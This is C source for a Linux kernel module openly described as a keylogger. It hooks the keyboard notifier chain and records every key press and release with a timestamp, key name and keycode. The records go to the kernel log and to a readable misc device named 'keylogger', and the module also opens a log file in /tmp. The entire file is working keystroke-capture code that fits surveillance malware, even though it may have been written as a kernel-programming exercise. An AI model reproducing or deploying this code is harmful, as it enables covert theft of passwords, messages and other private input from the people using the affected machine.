#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/notifier.h>
#include <linux/input.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <linux/timekeeping.h>
#include "keycode_to_us_string.c"

MODULE_LICENSE("GPL");		// GNU General Public License
MODULE_AUTHOR("mademir");
MODULE_DESCRIPTION("Keylogger");

#define LOG_DEVICE "keylogger"
#define LOG_FILE "/tmp/keylogger"
// #define INITIAL_BUFFER_SIZE 4096

static char		*device_buffer;
static size_t	buffer_offset;
static size_t	buffer_size;
static struct file				*logfile;

static int	log_func(struct notifier_block *nb, unsigned long action, void *data)
{
    struct keyboard_notifier_param *param = data;
	char	buff[16];
	struct timespec64	ts;
	struct tm	tm;
    int tz_offset = 2 * 60 * 60;
    char log[128];
    size_t log_len;
	int ascii_val;
	// size_t bytes_written;


    ktime_get_real_ts64(&ts);
    ts.tv_sec += tz_offset;
	time64_to_tm(ts.tv_sec, 0, &tm);

    if (action == KBD_KEYCODE)
	{
		keycode_to_us_string(param->value, param->shift, buff, 16, &ascii_val);
		if (ascii_val == 999)
			log_len = snprintf(log, sizeof(log), "%02d:%02d:%02d | NAME: %s | ASCII: n/a | KEYCODE: %d | %s\n", tm.tm_hour, tm.tm_min, tm.tm_sec, buff, param->value, param->down ? "pressed" : "released");
		else
			log_len = snprintf(log, sizeof(log), "%02d:%02d:%02d | NAME: %s | ASCII: %d | KEYCODE: %d | %s\n", tm.tm_hour, tm.tm_min, tm.tm_sec, buff, ascii_val, param->value, param->down ? "pressed" : "released");
        printk(KERN_INFO "%s", log);

		char *new_buffer = krealloc(device_buffer, buffer_offset + log_len + 1, GFP_KERNEL);
		if (!new_buffer)
		{
            printk(KERN_ERR "Keylogger: Failed to allocate more memory for device buffer\n");
            return NOTIFY_OK;
		}
		device_buffer = new_buffer;
		

	    // // Ensure device_buffer is allocated
        // if (!device_buffer) {
        //     device_buffer = kmalloc(INITIAL_BUFFER_SIZE, GFP_KERNEL);
        //     if (!device_buffer) {
        //         printk(KERN_ERR "Keylogger: Failed to allocate memory for device buffer\n");
        //         return NOTIFY_OK;
        //     }
        //     buffer_size = INITIAL_BUFFER_SIZE;
        //     buffer_offset = 0;
        // }

        // // Check if buffer needs reallocation
        // if (buffer_offset + log_len + 1 > buffer_size) {
        //     char *new_buffer = krealloc(device_buffer, buffer_size + log_len + 1, GFP_KERNEL);
		// 	printk(KERN_INFO "Keylogger: Reallocating memory !");
        //     if (!new_buffer) {
        //         printk(KERN_ERR "Keylogger: Failed to reallocate memory for device buffer\n");
        //         return NOTIFY_OK;
        //     }
        //     device_buffer = new_buffer;
        //     buffer_size += log_len + 1;
        // }

		memcpy(device_buffer + buffer_offset, log, log_len);
		buffer_offset += log_len;
		device_buffer[buffer_offset] = '\0';
	
		// if (logfile)
		// {
		// 	bytes_written = kernel_write(logfile, device_buffer, strlen(device_buffer), &logfile->f_pos);
		// 	if (bytes_written < 0)
		// 	{
		// 		printk(KERN_ERR "Keylogger: failed to write to %s\n", LOG_FILE);
		// 		filp_close(logfile, NULL);
		// 		return bytes_written;
		// 	}
		// }
	}

    return NOTIFY_OK;
}

static ssize_t	read_keylogger(struct file *file, char __user *buf, size_t count, loff_t *ppos)
{
	return simple_read_from_buffer(buf, count, ppos, device_buffer, buffer_offset);
}

static struct notifier_block	keyboard_notifier;
static struct miscdevice		misc_device;
static struct file_operations	fops;

static int	__init ModuleInit(void)
{
	printk(KERN_INFO "Keylogger: Load module\n");

	keyboard_notifier.notifier_call = log_func;

	misc_device.name = LOG_DEVICE;
	misc_device.minor = MISC_DYNAMIC_MINOR;
	misc_device.fops = &fops;

	fops.owner = THIS_MODULE;
	fops.read = read_keylogger;
	// fops.write = my_write;
	// fops.release = my_close;

	logfile = filp_open(LOG_FILE, O_CREAT | O_WRONLY | O_TRUNC, 0644);
	if (IS_ERR(logfile))
	{
        printk(KERN_ERR "Keylogger: Failed to open %s\n", LOG_FILE);
        return PTR_ERR(logfile);
    }

	int misc_ret = misc_register(&misc_device);
	if (misc_ret)
	{
		printk(KERN_INFO "Keylogger: Error during registering misc device");
		return -misc_ret;
	}
	else
	{
		printk(KERN_INFO "Keylogger: Misc device registered\n");
	}

	int keyboard_ret = register_keyboard_notifier(&keyboard_notifier);
	if (keyboard_ret)
	{
		printk(KERN_INFO "Keylogger: Keyboard notifier failed to register\n");
	}
	else
	{
		printk(KERN_INFO "Keylogger: Keyboard notifier registered\n");
	}

	return (0);
}

static void	__exit ModuleExit(void)
{
	printk(KERN_INFO "Keylogger: Exit module\n");

	if (logfile)
        filp_close(logfile, NULL);

    misc_deregister(&misc_device);
	unregister_keyboard_notifier(&keyboard_notifier);
    kfree(device_buffer);
	return ;
}

module_init(ModuleInit);
module_exit(ModuleExit);
